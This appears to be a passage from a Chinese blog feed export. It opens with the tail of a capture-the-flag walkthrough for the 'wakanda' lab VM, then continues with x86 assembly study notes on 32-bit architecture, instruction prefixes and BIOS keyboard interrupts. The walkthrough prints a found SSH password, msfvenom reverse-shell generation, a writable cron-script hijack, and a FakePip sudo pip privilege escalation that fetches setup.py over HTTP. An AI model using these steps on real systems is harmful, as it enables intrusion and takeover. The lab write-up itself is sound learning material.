ciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4= 对源码进行base64解码 获取到密码Niamey4Ever227!!! 网站所有者为mamadou SSH登陆 尝试使用此账号密码(mamadou、Niamey4Ever227!!!)登陆 1ssh mamadou@192.168.43.57 -p 3333 得到了一个python 2.7.9命令提示符界面 使用python模块来进入系统的bash shell 12import ptypty.spawn(&quot;/bin/bash&quot;) 查看mamadou用户的家目录，读取flag1.txt 利用系统中的其他用户 查看系统中其他用户 1cat /etc/passwd 发现devops用户，其家目录存在flag2.txt，但无访问权限 目录遍历 /tmp存在属主是devops用户的test文件 当前系统时间 相差时间较短，说明存在定时执行文件，定时修改/tmp/test文件内容 寻找定时任务文件 查找属主是devops用户的文件 1find / -user devops 2&gt;/dev/null 发现.py文件 且权限为所有人可写入 建立反向shell/srv/.antivirus.py中的内容为 /srv/.antivirus.py的作用是打开/tmp/test文件，并向其写入test 可以利用这个脚本，可以执行shellcode 生成shellcode 1msfvenom -p cmd/unix/reverse_python lhost=192.168.43.250 lport=4444 将shellcode写入.py文件 1nano /srv/.antivirus.py 监听端口，等待反弹shell 1nc -lvp 4444 获取devops用户shell 等待几分钟后，系统定时执行/srv/.antivirus.py文件，执行shellcode,获取反弹shell 读取flag2.txt 提权 查看用户devops的sudo权限 1sudo -l 发现用户devops可无密码执行的sudo命令只有/usr/bin/pip 利用pip漏洞进行提权 攻击机下载exp 1git clone https://github.com/0x00-0x00/FakePip.git 攻击机修改exp 更改脚本中shell的反弹地址为kali的地址 攻击机利用python建立SimpleHTTPServer 1python -m SimpleHTTPServer 8888 在kali当前目录上运行了一个简易的HTTP服务器，在靶机上就可从这个HTTP服务器下载setup.py脚本 被攻击机下载提权脚本 利用用户devops，下载脚本 123mkdir fakepipcd fakepipwget http://192.168.43.250:8888/setup.py kali中监听13372端口 1nc -lvvp 13372 攻击机执行exp 利用用户devops，执行脚本 1sudo /usr/bin/pip install . --upgrade --force-reinstall kali获取反弹shell 此为被攻击机root账户 查看最终flag]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>wakanda</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[x86汇编语言-从实模式到保护模式-32位Intel微处理器编程架构]]></title>
    <url>%2F2019%2F05%2F01%2Fx86%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E5%88%B0%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-32%E4%BD%8DIntel%E5%BE%AE%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B%E6%9E%B6%E6%9E%84%2F</url>
    <content type="text"><![CDATA[所谓处理器架构，或者处理其编程架构，是指一整套的硬件结构，以及与之相适应的工作状态 Intel32微处理器架构简称IA-32,以8086处理器为基础发展而来 8086有20根地址线，可寻址1MB内存。内部寄存器16位，无法在程序中访问整个1MB内存，所以，它是第一款支持内存分段模型的处理器。8086处理器只有一种工作模式，即实模式 32位的处理器有32根地址线，数据线的数量是32根或64根。它可以访问2^32，即4GB的内存，每次可读写连续的4字节或8字节，称为双字或4字访问 IA-32架构的基本执行环境寄存器的扩展在16位处理器内，有8个通用寄存器AX、BX、CX、DX、SI、DI、BP和SP，其中，前4个还可以拆分成两个独立的8位寄存器使用，即AH、AL、BH、BL、CH、CL、DH和DL 32位处理器在16位处理器的基础上，扩展了这8个通用寄存器的长度 为了在汇编语言中使用经过扩展的寄存器，需要给它们重命名，分别为EAX、EBX、ECX、EDX、ESI、EDI、ESP和EBP。可以在程序中使用这些寄存器，即使在实模式中 指令的源操作数与目的操作数必须具有相同的长度，个别特殊用途的指令除外 1234mov eax,f0000005hmov ecx,eaxadd edx,ecxmov eax,f5h ;EAX&lt;-000000f5h 1mov eax,cx ;错误的汇编指令，位数不符 32位通用寄存器的高16位是不可独立使用的，但低16位保持同16位处理器的兼容性 123mov ah,02hmov al,03hadd ax,si 32位处理器有自己的32位工作模式。在32位保护模式下，可以完全、充分的发挥处理器的性能，同时，处理器可以使用它全部的32根地址线，能够访问4GB的内存 32位处理器扩展了IP，使之达到32位，即EIP 当它工作在16位模式下，使用16位IP；工作在32位模式下，使用全部的32位EIP 16位处理器中，标志寄存器FLAGS为16位，在32位处理器中，扩展到32位，低16位和原先保持一致 在32位模式下，对内存的访问从理论上来说不再需要分段，因其有32根地址线，可以自由访问4GB内存的任何一个内存位置。但IA-32架构的处理器是基于分段模型的，则32位处理器依然需要以段为单位访问内存，只分一个段，段的基地址为00000000h，段的长度为4GB。在这种情况下，可视为不分段，即平坦模型 在16位模式下，一个程序可以自由的访问不属于它的内存位置，甚至可以对那些地方的内容进行修改，这是不安全的。在32位模式下，处理器要求在加载程序时，先定义该程序所拥有的段，然后允许使用这些段。定义段时，除了基地址外，还附加了段界限、特权级别、类型的等属性。当程序访问一个段时，处理器将用固件实施各种检查工作，以防止对内存的违规访问 在32位模式下。传统的段寄存器，如CS、SS、DS、ES，保存的不再是16位段地址，而是段的选择子，即用于选择所要访问的段，它的新名称为段选择器。除段选择器外，每个段寄存器还包括一个64位的不可见部分，称为描述符高速缓存器，里面有段的基地址和各种访问属性，这部分内容不可见，由处理器自动使用 32位处理器增加了两个额外的段寄存器FS和GS 基本的工作模式8086具有16位的段寄存器、指令寄存器和通用寄存器，称为16位的处理器。尽管8086可以访问1MB的内存，但只能分段进行，而且由于只使用16位的段内偏移量，故段的长度最大只能是64KB 80286处理器段寄存器16位，而且只能使用16位的偏移地址，在实模式下只能使用64KB的段；尽管它有24根地址线，理论上可以访问2^24，即16MB的内存，但依然只能分为多个段来进行 80286处理器第一次提出了保护模式的概念，在保护模式下，段寄存器中保存的不再是段地址，而是段选择子，真正的段地址位于段寄存器的描述符高速缓存中，是24位的。因此，运行在保护模式下的80286处理器可以访问全部的16MB内存 80386处理器的寄存器是32位的，而且拥有32根地址线，可以访问2^32，即4GB的内存 在保护模式下，所有的32位处理器都可以访问多达4GB的内存，它们可以工作在分段模式下，每个段的基地址为32位的，段内偏移为32位的，因此，段的长度不受限制。32位保护模式兼容80286的16位保护模式 32位处理器提供虚拟8086模式(V86模式)，在这种模式下，IA-32处理器被模拟成多个8086处理器并行工作。V86模式是保护模式的一种，可以在保护模式下执行多个8086程序 线性地址IA-32处理器编程时，访问内存时，需提供段地址和偏移量 段的管理由处理器的段部件负责进行，段部件将段地址和偏移地址相加，得到访问内存的地址，一般来说，段部件产生的地址就是物理地址 IA-32处理器在多任务环境下，对程序内存进行分配和回收，会产生内存碎片，IA-32处理器支持分页功能，分页功能将物理内存空间划分为逻辑上的页。页的大小是固定的，一般为4KB，通过分页，可以简化内存管理 当分页功能开启时，段部件产生的地址就不再是物理地址了，而是线性地址，线性地址要经过页部件转换后，才是物理地址 线性地址的概念用来描述任务的地址空间。IA-32处理器的每个任务都拥有4GB的虚拟内存空间，是一段长4GB的平坦空间，叫做线性地址空间。相应的，由段部件产生的地址，就对应着线性地址空间上的每一个点，就是线性地址 现代处理器的结构和特点流水线8086时代，处理器就存在指令预取队列。当指令执行时，若总线空闲(无访问内存的操作)，就可以在指令执行的同时预取指令并提前译码，可以大大加快程序的执行速度 为提高处理器的执行效率和速度，可以将一条指令的执行过程分解为若干个细小的步骤，并分配给相应的单元来完成。各个单元的执行是独立的、并行的。如此一来，各个步骤的执行在时间上就会重叠起来，这种执行指令的方法就是流水线技术 3级流水线： 一般来说，流水线的效率受执行时间最长的那一级的限制，要缩短各级的执行时间，就必须让每一级的任务减少，与此同时，需要将一些复杂的任务再进行分解 高速缓存因为需要等待内存和硬盘这样的慢速设备，处理器便无法全速运行。为缓解这一矛盾，高速缓存应运而生。高速缓存是处理器和内存之间的一个静态存储器，容量较小，但速度可以与处理器匹配 程序运行时的局部性原理：程序常常访问最近刚刚访问过的指令和数据，或者与它们相邻的指令和数据 利用程序运行时的局部性原理，可以把处理器正在访问和即将访问的指令和数据块从内存调入高速缓存中。当处理器要访问内存时，首先检索高速缓存，若要访问的内容已在高速缓存中，那么可以用极快的速度直接从高速缓存中取得，称为命中；否则，称为不中。在不中的情况下，处理器在取得需要的内容之前必须重新装载高速缓存，而不只是直接到内存中取得所需要的内容 高速缓存的转载以块为单位，包括装载所需数据的邻近内容。为此，需要额外的时间来等待块从内存载入高速缓存，在该过程中损失的时间称为不中惩罚 在一些复杂的处理器内部，会存在多级高速缓存，分别应用于各个独立的执行部件 乱序执行为实现流水线技术，需要将指令拆分为更小的可独立执行部分，即拆分成微操作 例： 1add [mem],eax 可拆分为三个微操作，一个从内存中读数据，一个执行相加动作，一个用于将相加的结果写回内存中 一旦将指令拆分为微操作，处理器就可以在必要的时候乱序执行程序 1234mov eax,[mem1]shl eax,5add eax,[mem2]mov [mem3],eax 指令add eax,[mem2]可以拆分为两个微操作。在执行逻辑左移指令的同时，处理器可以提前从内存中读取mem2的内容。典型的，若数据不在高速缓存中(不中)时，那么处理器在获取mem1的内容后，会立即开始获取mem2的内容，与此同时，shl指令的执行早就开始了 寄存器重命名123456mov eax,[mem1]shl eax,3mov [mem2],eaxmov eax,[mem3]add eax,2mov [mem4],eax 上述代码中，前三条与后三条进行了两件互不相关的事。但是在代码中使用了相同的寄存器。此时，处理器为最后三条指令使用了另一个不同的临时寄存器，用于左移指令和加法指令可以并行处理 IA-32架构的处理器只有8个32位的通用寄存器。不过，在处理器的内部，却有大量的临时寄存器可用，处理器可以重命名这些寄存器以代表一个逻辑寄存器 寄存器重命名以一种完全自动和非常简单的方式工作。每当指令写逻辑寄存器时，处理器就为那个逻辑寄存器分配一个新的临时寄存器 123456mov eax,[mem1]mov ebx,[mem2]add ebx,eaxshl eax,3mov [mem3],eaxmov [mem4],ebx 若mem1的内容在高速缓存中，可立即取得。mem2内容不在高速缓存中。此时，逻辑左移操作可以在加法指令之前开始(使用临时寄存器代替EAX)。 将mem1的内容写入eax后，mem2的内容需要从内存读取，此时，使用临时寄存器存储逻辑左移指令的结果，eax中仍然只是存储mem1的内容，用于使用eax执行完加法指令 若没有寄存器重命名机制，逻辑左移操作将不得不等待从内存中读取mem2的内容到ebx寄存器并进行完加法操作之后才得以执行 在所有操作完成后，那个临时寄存器中存储的eax寄存器的最终结果才被写入真实的eax寄存器，该过程称为引退 所有的通用寄存器，堆栈指针、标志、浮点寄存器，甚至段寄存器都有可能被重命名 分支目标预测流水线并不是百分之百完美的解决方案。事实上，有很多潜在的因素会使得流水线不能达到最佳效率。典型的情况，若遇到一条转移指令，则后面那些已经进入到流水线的指令就都无效了。即，必须清空流水线，从要转移的目标位置处重新取指令放入流水线 在现代处理器中，流水线操作分为很多步骤，包括取指令、译码、寄存器分配和重命名、微操作排序、执行和引退。指令的流水线处理方式允许处理器同时做很多事情 流水线的最大问题是代码中经常存在分支，流水线越长，处理器在用错误的分支填充流水线时，浪费的时间越多 为解决这个问题，在Pentium Pro处理器上，引入分支预测技术。分支预测的核心问题是：转移是发生还是不会发生，或条件转移指令的条件会不会成立 从统计学的角度来看，有些事情一旦出现，下一次还会出现的概率较大。一个典型的案例就是循环，当循环执行一次后，下一次还会执行，而不是顺序向下执行，事实上，这个预测通常是很准的 在处理器内部，有一个小容量的高速缓存器，叫做分支目标缓存器(BTB)，当处理器执行了一条分支语句后，它会在BTB中记录当前指令的地址、分支目标的地址，以及本次分支预测的结果。下一次，在那条转移指令实际执行前，处理器会查找BTB，看有没有最近的转移记录。若可以找到对应的条目，则推测执行和上一次相同的分支，把该分支的指令送入流水线 当该指令实际执行时，若预测是失败的，那么，清空流水线，同时刷新BTB中的记录。代价较大 32位模式的指令系统32位处理器的寻址方式在16位处理器上，指令中的操作数可以是8位或者16位的寄存器、指向8位或者16位实际操作数的16位内存地址，以及8位或16位的立即数 16位处理器，使用基址寄存器同变址寄存器，再加上8位或16位偏移量来寻址内存操作数 32位处理器兼容16位处理器的工作模式，可以运行传统的16位代码，但是，它有自己独立的32位运行模式 在32位模式下，默认使用32位宽度的寄存器 1mov eax,ebx 若指令中使用了立即数，那么，默认该数值也是32位的 1mov ecx,55h ;ECX&lt;-00000055 若指令中的操作数是指向内存单元的地址，那么，该地址默认是32位的段内偏移地址，或称做段内偏移量 1mov edx,[mem] ;mem是一个32位的段内偏移地址 32位处理器的寻址方式可以使用全部的32位通用寄存器作为基址寄存器。同时，还可以再加上一个除ESP之外的32位通用寄存器作为变址寄存器。变址寄存器允许乘以1、2、4或8作为比例因子。最后，还允许加上一个8位或32位的偏移量 操作数大小的指令前缀每一条处理器指令都可以拥有前缀，例重复前缀(REP/REPE/REPNE)、段超越前缀(ES:)、总线封锁前缀(LOCK)等 前缀是可选的，每个前缀的长度是1字节，每条指令可以拥有1–4个前缀，或者不使用前缀 前缀(如果有的话)的后面是操作码部分。操作码的长度是1–3字节。操作码可以表示指令执行什么操作，同时，操作码还可以指示操作的字长，即数据宽度为字节还是字 操作码之后是操作数类型和寻址方式部分。此部分可选。简单指令不包含此部分，此部分也可以有1–2字节。这部分给出了指令的寻址方式，以及寄存器的类型 指令的最后是立即数和偏移量，可以是1、2或4字节 例： 1mov dx,[bx+si+02h] 在16位指令编码格式中，内存单元到寄存器的传送指令使用操作码8BH，在8BH之后是1字节的寻址方式和操作数类型部分。第7位和第6位是01，表示使用了基地址变址的寻址方式，且带有8位偏移量；第5–3位为010，指示目的操作数为寄存器DX；位2–0位为000，表示寻址方式为BX+SI+8位偏移量。在该字节之后，是1字节的偏移量02h。因此，这条指令编译后的机器代码为 18B 50 02 32位处理器使用相同的编码格式，但寻址方式和寄存器的定义不同于16位指令。在32位处理器上，第7位和第6位的值是01，表示使用基址寻址方式，且带有8位偏移量；第5–3位为010，指示目的操作数为寄存器EDX；第2–0位为000，表示寻址方式为EAX+8位偏移量。在该字节之后，是1字节的偏移量02h。因此，同样的机器指令码，却对应不同的32位指令： 1mov edx,[eax+02h] 即，相同的机器指令，在16位模式下和32位模式下的解释和执行效果是不同的 32位处理器可以执行16位的程序。为此，在16位模式下，处理器将所有的指令都看作16位的。 机器指令吗40h在16位模式下的含义： 1inc ax 当处理器在16位模式下运行时，也可以使用32位的寄存器，执行32位的运算。为此，必须使用指令前缀66h来临时改变这种默认状态。因此，当处理器在16位模式下运行时，机器指令码66 40对应的指令不再是inc ax，而是inc eax(16位模式下执行32位指令) 相反的，若处理器运行在32位模式下，处理器默认指令的操作数为32位的，若添加66h指令前缀，用于指示指令是16位的(32位模式执行16位指令) 即，指令前缀66h具有反转当前默认操作数大小的作用 在编写程序的时候，就应考虑到指令的运行环境。为指明程序的默认运行环境，编译器提供伪指令bits，用于指明其后的指令应该被编译成16位还是32位的 1234567bits 16 ;可写作[bits 16]mov cx,dx ;89 D1mov eax,ebx ;66 89 D8 添加66h指令前缀，表示此指令虽使用32位寄存器，但为16位指令bits 32 ;可写作[bits 32]mov cx,dx ;66 89 D1 添加66h指令前缀，表示此指令虽使用16位寄存器，但为32位指令mov eax,ebx ;89 D8 16位模式是默认的编译模式，若为指定指令的编译模式，则默认是bits 16的 一般指令的扩展32位的处理器都拥有32位的寄存器和算术逻辑部件，而且同内存芯片之间的数据通路至少是32位的，因此，所有以寄存器或者内存单元为操作数的指令都被扩充，以适应32位的算术逻辑操作。而且，这些扩展的操作即使是在16位模式下（实模式和16位保护模式）也是可用的 双操作数指令、单操作数指令允许32位操作数 逻辑移动指令，如shl、shr等，目的操作数也扩展至32位 和16位处理器相同，在32位处理器上，逻辑移动指令的源操作数如果是寄存器的话，则依然必须使用CL。同时，32位处理器在实际执行时，要先将源操作数（在CL寄存器内）同1FH做逻辑与。也就是说，仅保留源操作数的低5位，因此，实际移动的次数最大为31 在16位处理器上，loop指令的循环次数在寄存器CX中。在32位处理器上，如果当前的运行模式是 16 位的，那么，loop指令执行时，依然使用CX寄存器；否则，如果运行在32位模式下，则使用的是ECX寄存器 16位处理器中，无符号数乘法指令mul格式为： 12mul r/m8 ;AX ← AL×r/m8 mul r/m16 ;DX:AX ← AX×r/m16 32位处理器中，除了上述支持外，还支持以下扩展 1mul r/m32 ;EDX:EAX ← EAX×r/m32 有符号数乘法指令imul与此相同 无符号数和有符号数除法也做了32位扩展 12div r/m32 idiv r/m32 被除数是64位的，高32位在EDX寄存器；低32位在EAX寄存器。除数是32位的，位于32位的寄存器或内存单元。指令执行后，32位的商在EAX寄存器,32位的余数在EDX寄存器 32位处理器的堆栈操作指令push和pop也有所扩展，允许压入双字操作数 特别是，现在支持立即数压栈操作 123push imm8 ;操作码为 6A push imm16 ;操作码为 68 push imm32 ;操作码为 68 例：压入字节数据 1push byte 55h byte仅仅是给编译器用的，告诉编译器，压入的是字节，而不是用来在编译后的机器指令前添加指令前缀 这条指令的16位形式和32位形式是一样的，机器 代码都是6A 55 但是，当它执行时，就不同了。注意，无论在什么时候，处理器都不会真的压入一字节，要么压入字，要么压入双字 在16位模式下，默认的操作数字长是16，处理器在执行时，将该字节的符号位扩展高8位，然后压入堆栈，压栈时使用SP寄存器，且先将SP的内容减去2。这就是说，实际压入堆栈中的数值是0055h 在32位模式下，压入的内容是该字节操作数符号位扩展高24位的结果，即 00000055h。压栈时使用ESP寄存器，且先将ESP的内容减去4。 如果压入的是字操作数，则必须用关键字word来修饰 例：压入字数据 1push word fffbh 在16位模式下，默认的操作数字长是16，处理器在执行时，直接压入该字，压栈时使用SP寄存器，且先将SP的内容减去2 在 32 位模式下，压入的内容是该操作数符号位扩展高16位的结果，即FFFFFFFBH，压栈时使用ESP寄存器，且先将ESP的内容减去4 如果压入的是双字操作数，则必须用关键字dword来修饰 例：压入双字数据 1push dword fbh 无论是在16位模式下，还是在32位模式下，压入的都是000000FBH，而且堆栈指针寄存器（SP或者ESP）都先减去4 对于实际操作数位于通用寄存器，或者位于内存单元的情况，只能压入字或者双字 指令格式为： 12push r/m16 push r/m32 如果是寄存器，则可以使用16位或者32位的通用寄存器 如果被压入的16位或者32位操作数位于内存单元中，则必须用关键字word或者dword修饰，以指示操作数的大小 12push word [0x2000] push dword [ecx+esi*2+0x02] 无论被压入的数位于寄存器，还是位于内存单元，在16位模式下，如果压入的是字操作数，那么 先将SP的内容减去2；如果压入的是双字，应当先将SP的内容减去4 在32位模式下，如果压入的是字操作数，那么先将ESP的内容减去2；如果压入的是双字，应当先将ESP的内容减去4 段寄存器压入栈 格式： 123456push cs ;机器指令为 0Epush ds ;机器指令为 1Epush es ;机器指令为 06 push fs ;机器指令为 0F A0push gs ;机器指令为 0F A8push ss ;机器指令为 16 在16位模式下，先将SP的内容减去2，然后直接压入段寄存器的内容 在32位模式下，要先将段寄存器的内容用零扩展到32位，即高16位为全零。然后，将ESP的内容减去4，再压入扩展后的32位值]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>x86汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-Intel系列微处理器的3种工作模式]]></title>
    <url>%2F2019%2F04%2F30%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-Intel%E7%B3%BB%E5%88%97%E5%BE%AE%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%843%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[微机中常用的Intel系列微处理器的主要发展过程：8080、8086/8088、80186、80286、80386、80486、Pentium、Pentium II、Pentium III、Pentium4 8086/8088不具备实现一个完善的多任务操作系统的功能 80286具备了对多任务系统的支持，但无法对8086/8088进行兼容，妨碍了用户对原8086机上的程序的使用 Intel开发了80386微处理器，它可以在以下3个模式下工作： 实模式：工作方式相当于一个8086 保护模式：提供支持多任务环境的工作方式，建立保护机制(与VAX等小型机类似) 虚拟8086模式：可从保护模式切换至其中的一种8086工作方式。这种方式使用户可以方便的在保护模式下运行一个或多个原8086程序 以后的各代微处理器都提供了上述3种工作模式 任何一台使用Intel系列CPU的PC机只要一开机，CPU就工作在实模式下 若安装DOS操作系统，那么在DOS加载后CPU仍以实模式工作 若安装Windows操作系统，那么Windows加载后，将由Windows将CPU切换到保护模式下工作，因Windows是多任务系统，它必须在保护模式下运行 若在Windows种运行一个DOS下的程序，或者点击开始菜单在程序项中进入MS-DOS方式。那么Windows将CPU切换到虚拟8086模式下运行该程序 可以从保护模式直接进入能运行原8086程序的虚拟8086模式是很有意义的，为用户提供了可以在现有的多任务系统中方便的运行原8086系统中的程序的一种机制]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-使用BIOS进行键盘输入和磁盘读写]]></title>
    <url>%2F2019%2F04%2F29%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E4%BD%BF%E7%94%A8BIOS%E8%BF%9B%E8%A1%8C%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%E5%92%8C%E7%A3%81%E7%9B%98%E8%AF%BB%E5%86%99%2F</url>
    <content type="text"><![CDATA[大多数有用的程序都需要处理用户的输入，键盘输入是最基本的输入 程序和数据通常需要长期存储，磁盘是最常用的存储设备 BIOS为这两种外设的I/O提供了最基本的中断例程 int 9中断例程对键盘输入的处理键盘输入将引发9号中断，BIOS提供了int 9中断例程。CPU在9号中断发生后，执行int 9中断例程，从60h读出扫描码，并将其转化为相应的ASCII码或状态信息，存储在内存的指定空间(键盘缓冲区或状态字节)中 一般的键盘输入，在CPU执行完int 9中断例程后，都放到了键盘缓冲区中。键盘缓冲区中有16个字单元，可以存储15个按键的扫描码和对应的ASCII码 按照键盘缓冲区的逻辑结构，看一下键盘输入的扫描码和对应的ASCII码是如何写入键盘缓冲区的? BIOS键盘缓冲区是用环形队列结构管理的内存区 初始状态，无键盘输入，键盘缓冲区为空 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 按下A键，引发键盘中断；CPU执行int 9中断例程，从60h端口读出A键的通码；然后检测状态字节，查看是否有Shift、Ctrl等切换键按下；发现无切换键按下，则将A的扫描码1eh和对应字母a的ASCII码61h，写入键盘缓冲区。 缓冲区的字单元中，高位字节存储扫描码，低位字节存储ASCII码 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1E61 按下B键，引发键盘中断；CPU执行int 9中断例程，从60h端口读出B键的通码；然后检测状态字节，查看是否有Shift、Ctrl等切换键按下；发现无切换键按下，则将B的扫描码30h和对应字母b的ASCII码62h，写入键盘缓冲区。 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1E61 3062 按下C、D、E键后，缓冲区内容如下： 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1E61 3062 2E63 2064 1265 按下左Shift键，引发键盘中断；int 9中断例程接收左Shift键的通码，设置0040:17处的状态字节的第1位为1，表示左Shift键按下(0040:17单元存储键盘状态字节，该字节记录了控制键和切换键的状态。第1位置1表示左shift按下) 按下A键，引发键盘中断；CPU执行int 9中断例程，从60h端口读出A键的通码；然后检测状态字节，发现左Shift键按下；则将A的扫描码1eh和Shift_A对应ASCII码，即字母A的ASCII码41h，写入键盘缓冲区。 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1E61 3062 2E63 2064 1265 1E41 松开左Shift键，引发键盘中断；int 9中断例程接收左Shift键的断码，设置0040:17处的状态字节的第1位为0，表示左Shift键松开 按下A键，引发键盘中断；CPU执行int 9中断例程，从60h端口读出A键的通码；然后检测状态字节，查看是否有Shift、Ctrl等切换键按下；发现无切换键按下，则将A的扫描码1eh和对应字母a的ASCII码61h，写入键盘缓冲区。 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1E61 3062 2E63 2064 1265 1E41 1E61 使用int 16h中断例程读取键盘缓冲区BIOS的int 16h中断例程中包含的一个最重要的功能是从键盘缓冲区读取一个键盘输入，该功能的编号为0 从键盘缓冲区中读取一个键盘输入，并将其从缓冲区中删除： 12mov ah,0int 16h 结果：(ah)=扫描码，(al)=ASCII码 执行 12mov ah,0int 16h 后，ah中内容为30h，al中的内容为62h 缓冲区的内容如下 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 3062 2E63 2064 1265 1E41 1E61 执行6次 12mov ah,0int 16h 后，ah中内容为1Eh，al中的内容为61h 缓冲区空 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 执行 12mov ah,0int 16h int 16h中断例程检测键盘缓冲区，发现缓冲区空，则循环等待，直到缓冲区中有数据 按下A键后，缓冲区内容如下 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1E61 循环等待的int 16h中断例程检测到键盘缓冲区中有数据，将其读出，缓冲区又为空 ah中内容为1Eh，al中的内容为61h 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int 16h中断例程的0号功能工作如下： 检测键盘缓冲区中是否有数据 没有则循环进行第1步 读取缓冲区第一个字单元中的键盘输入 将读取的扫描码送入ah，ASCII码送入al 将已读取的键盘的输入从缓冲区中删除 BIOS的int 9中断例程和int 16h中断例程是一对相互配合的程序，int 9中断例程向键盘缓冲区中写入，int 16h中断例程从缓冲区中读出 int 9中断例程是在有键按下的时候向键盘缓冲区中写入数据；int 16h中断例程是在应用程序对其进行调用的时候，将数据从键盘缓冲区中读出 编程，接收用户的键盘输入，更改字符颜色输入”r”，将屏幕中的字符设为红色；输入”g”，将屏幕中的字符设为绿色；输入”b”，将屏幕中字符设为蓝色 123456789101112131415161718192021222324252627282930313233assume cs:codecode segmentstart: mov ah,0 int 16h ;获取键盘缓冲区中的键盘输入 mov ah,1 cmp al,&apos;r&apos; je red cmp al,&apos;g&apos; je green cmp al,&apos;b&apos; je blue jmp short sret red: shl ah,1green: shl ah,1blue: mov bx,0b800h mov es,bx mov bx,1 mov cx,2000 s: and byte ptr es:[bx],11111000b or es:[bx],ah add bx,2 loop s sret: mov ax,4c00h int 21h code endsend start 字符串的输入用户通过键盘输入的通常不仅仅是单个字符而是字符串 最基本的字符串输入程序，具备以下功能： 在输入的同时需要显示这个字符串 一般在输入回车符后，字符串输入结束 能够删除已经输入的字符 编写一个接收字符串输入的子程序子程序的参数如下： (dh)、(dl)=字符串在屏幕上显示的行、列位置 ds:si指向字符串的存储空间，字符串以0为结尾符 分析： 字符的输入和删除 字符的输入和输出是按照栈的访问规则进行的，即后进先出 字符串的存储空间为一个字符栈。字符栈中的所有字符，从栈底到栈顶，组成一个字符串 在输入回车符后，字符串输入结束 输入回车符后，可以在字符串中加入0，表示字符串结束 在输入的同时需要显示这个字符串 每次字符输入和删除时，都应重新显示字符串，即从字符栈的栈底到栈顶，显示所有字符 程序的处理过程 调用int 16h读取键盘输入 若是字符，进入字符栈，显示栈中的所有字符；继续执行第1步 若是退格键，从字符栈中弹出一个字符，显示字符栈中的所有字符；继续执行第1步 若是回车键，向字符栈中压入0，返回 子程序：字符栈的入栈、出栈和显示 参数说明： (ah)=功能号，0表示入栈、1表示出栈、2表示显示 ds:si指向字符栈空间 对于0号功能：(al)=入栈字符 对于1号功能：(al)=返回的字符 对于2号功能：(dh)、(dl)=字符串在屏幕上显示的行、列位置 在显示栈中字符时，要清除屏幕中上一次显示的内容，再从栈中取字符串重新显示 